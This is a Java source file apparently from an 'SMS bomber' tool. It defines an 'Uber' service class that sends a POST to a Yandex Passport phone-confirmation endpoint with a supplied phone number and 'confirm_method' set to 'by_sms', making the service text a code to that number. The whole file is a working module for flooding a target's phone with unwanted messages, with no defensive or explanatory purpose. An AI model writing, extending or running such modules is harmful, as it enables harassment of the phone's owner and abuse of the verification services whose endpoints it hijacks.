package com.dm.bomber.services;

import okhttp3.FormBody;

public class Uber extends FormService {

    public Uber() {
        setUrl("https://mobileproxy.passport.yandex.net/1/bundle/phone/confirm/submit");
        setMethod(POST);
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("number", getFormattedPhone());
        builder.add("display_language", "ru");
        builder.add("gps_package_name", "ru.yandex.uber");
        builder.add("confirm_method", "by_sms");
    }
}
